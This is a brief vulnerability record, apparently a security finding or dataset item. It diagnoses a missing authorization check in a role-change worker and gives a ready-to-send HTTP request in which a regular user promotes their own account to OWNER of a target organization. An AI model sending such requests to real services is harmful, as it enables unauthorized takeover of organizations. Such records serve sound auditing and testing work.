diagnosis: The worker processes organization member role changes enqueued via Redis Streams. It sets member role to newRole in organizationId without validating that the actor who initiated the event possesses OWNER or ADMIN privileges in organizationId, allowing arbitrary users to elevate their privileges to OWNER.
exploit_request:
POST /api/teams/events/role-change HTTP/1.1
Host: app.collaboratehub.com
Authorization: Bearer <regular_user_jwt>
Content-Type: application/json

{"organizationId": "org_enterprise_target_01", "memberId": "usr_attacker_account", "newRole": "OWNER"}
